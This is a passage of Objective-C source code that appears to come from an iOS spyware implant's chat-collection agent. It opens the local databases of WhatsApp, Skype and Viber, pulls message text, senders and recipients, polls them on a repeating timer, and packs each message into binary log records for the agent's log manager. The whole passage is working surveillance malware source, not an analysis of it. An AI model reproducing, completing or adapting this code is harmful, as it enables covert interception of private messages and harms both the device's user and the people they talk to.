    text = [self getSqlLiteString:aCompiledStat colNum:ZTEXT_POS];
  }
  
  return text;
}

- (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
                                  withDate:(int)theDate
{
  NSNumber *flags = nil;
  char wa_msg_query[256];
  NSMutableArray *retArray = nil;
  sqlite3_stmt *compiledStatement;
  NSNumber *type = [NSNumber numberWithInt:WHATS_TYPE];
  
  char _wa_msg_query[] =
    "select ZTEXT, ZISFROMME, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK, ZCHATSESSION from ZWAMESSAGE where ZMESSAGEDATE >";

  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
  
  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      int z_pk = sqlite3_column_int(compiledStatement, Z_PK_POS);
       
      if (z_pk > mLastWAMsgPk)
      {
        mLastWAMsgPk = z_pk;
        
        NSString *text = [self getText:compiledStatement fromDB:theDB];
        
        if (text != nil)
        {
          NSString *sndr = [self getFromJID:compiledStatement fromDB: theDB];
          NSString *peer = [self getToJID:compiledStatement fromDB:theDB excluding:sndr];
          
          if ([sndr compare:mWAUsername] == NSOrderedSame)
            flags = [NSNumber numberWithInt:0x00000001];
          else
            flags = [NSNumber numberWithInt:0x00000000];
          
          if (peer == nil)
            peer = @" ";
          if (sndr == nil)
            sndr = @" ";
          
          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text,  @"text",
                                                                             peer,  @"peers",
                                                                             sndr,  @"sender",
                                                                             type,  @"type",
                                                                             flags, @"flags",nil];
          if (retArray == nil)
            retArray = [NSMutableArray arrayWithCapacity:0];
          
          [retArray addObject: tmpDict];
      
        }
      }
    }
    
    sqlite3_finalize(compiledStatement);
  }
  
  return retArray;
}

#pragma mark -
#pragma mark Chat logging
#pragma mark -

/* old char version* - begin */
- (NSMutableData*)createWAChatLog:(NSString*)_sender
                        withPeers:(NSString*)_peers
                          andText:(NSString*)_text
{
  NSData *processName         = [@"WhatsApp" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *topic               = [@"-" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];  
  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_text dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

  NSMutableData *entryData    = [NSMutableData dataWithCapacity:0];
  
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
 
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Content
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: content];  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  return entryData;
}
/* old char version* - end */

- (NSMutableData*)createNewChatLog:(NSString*)_sender
                         withPeers:(NSString*)_peers
                              text:(NSString*)_text
                              type:(NSNumber*)theType
                          andFlags:(NSNumber*)theFlags
{
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  short unicodeNullTerminator = 0x0000;
  time_t rawtime;
  struct tm *tmTemp;
  int32_t programType = [theType intValue];
  int32_t flags = 0x00000000;

  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_text dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *entryData    = [NSMutableData dataWithCapacity:0];
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }

  flags = [theFlags intValue];
  
  // Program
  [entryData appendBytes: &programType length:sizeof(programType)];
  
  // Incoming/outcoming
  [entryData appendBytes: &flags length:sizeof(flags)];
  
  // From
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // From_to
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // to
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];

  // to_display
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Content
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];

  // Delim
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  return entryData;
}

- (void)writeChatLogs:(NSArray*)chatArray
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (chatArray == nil || [chatArray count] == 0)
  {
    [pool release];
    return;
  }
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog:LOG_CHAT_NEW
                           agentHeader:nil
                             withLogID:0];
  if (success == FALSE)
  {
    [pool release];
    return;
  }
  
  for (int i=0; i < [chatArray count]; i++)
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSDictionary* tmpChat = [chatArray objectAtIndex:i];
    
    NSMutableData *tmpData = [self createNewChatLog:[tmpChat objectForKey:@"sender"]
                                          withPeers:[tmpChat objectForKey:@"peers"]
                                               text:[tmpChat objectForKey:@"text"]
                                               type:[tmpChat objectForKey:@"type"]
                                           andFlags:[tmpChat objectForKey:@"flags"]];
    
    [logManager writeDataToLog:tmpData
                      forAgent:LOG_CHAT_NEW
                     withLogID:0];
    
    [inner release];
  }
  
  [logManager closeActiveLog:LOG_CHAT_NEW
                   withLogID:0];
  
  [self setProperties];
  
  [pool release];
}

#pragma mark -
#pragma mark Viber chat
#pragma mark -

- (NSMutableArray*)getVbChats
{
  sqlite3 *db;
  NSMutableArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    return chatArray;
  }
  
  if ((db = [self openVbChatDB]) == NULL)
  {
    sqlite3_close(db);
    return chatArray;
  }
  
  chatArray = [self getVbChatMessagesFormDB:db withDate:mLastVbMsgPk];
  
  [self closeVbChatDB: db];
  
  return chatArray;
}

#pragma mark -
#pragma mark Whatsapp chat
#pragma mark -

- (NSMutableArray*)getWAChats
{
  sqlite3 *db;
  NSMutableArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    return chatArray;
  }
  
  if ((db = [self openWAChatDB]) == NULL)
  {
    sqlite3_close(db);
    return chatArray;
  }
  
  chatArray = [self getWAChatMessagesFormDB: db withDate:mLastWAMsgPk];
  
  [self closeWAChatDB: db];
  
  return chatArray;
}

#pragma mark -
#pragma mark Skype chat
#pragma mark -

- (NSMutableArray*)getSkChats
{
  sqlite3 *db;
  NSMutableArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    return chatArray;
  }
  
  if ((db = [self openSkChatDB]) == NULL)
  {
    sqlite3_close(db);
    return chatArray;
  }
  
  chatArray = [self getSkChatMessagesFormDB:db withDate:mLastSkMsgPk];
  
  [self closeSkChatDB: db];
  
  return chatArray;
}

#pragma mark -
#pragma mark Chats polling routine
#pragma mark -

- (void)getChat
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *waChats = nil;
  NSMutableArray *skChats = nil;
  
  // temporary disabled for testing
  //NSMutableArray *vbChats = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [pool release];
    return;
  }
    
  skChats = [self getSkChats];
  
  waChats = [self getWAChats];

  // temporary disabled for testing
  //vbChats = [self getVbChats];
  
  [self writeChatLogs:waChats];

  [self writeChatLogs:skChats];

  // temporary disabled for testing
  //[self writeChatLogs:vbChats];
  
  [pool release];
}

- (void)setChatPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getChat) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentChatRunLoopMode];
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL bSkype = [self isThereSkype];
  BOOL bViber = [self isThereViber];
  BOOL bWhatsApp = [self isThereWahtsApp];
  
  if ([self isThreadCancelled] == TRUE ||
      (bSkype == FALSE && bViber == FALSE && bWhatsApp == FALSE))
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [outerPool release];
    return;
  }
  
  [self logChatContacts:mWAUsername appName:@"WhatsApp" flag:WHATS_APP_FLAG];
  
  [self logChatContacts:mSkUsername appName:@"Skype" flag:SKYPE_APP_FLAG];
  
  [self logChatContacts:mVbUsername appName:@"Viber" flag:VIBER_APP_FLAG];
  
  [self getProperties];
  
  [self setChatPollingTimeOut:CHAT_TIMEOUT];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    [[NSRunLoop currentRunLoop] runMode:k_i_AgentChatRunLoopMode
                             beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.00]];
    
    [innerPool release];
  }
  
  [self setMAgentStatus:AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}
@end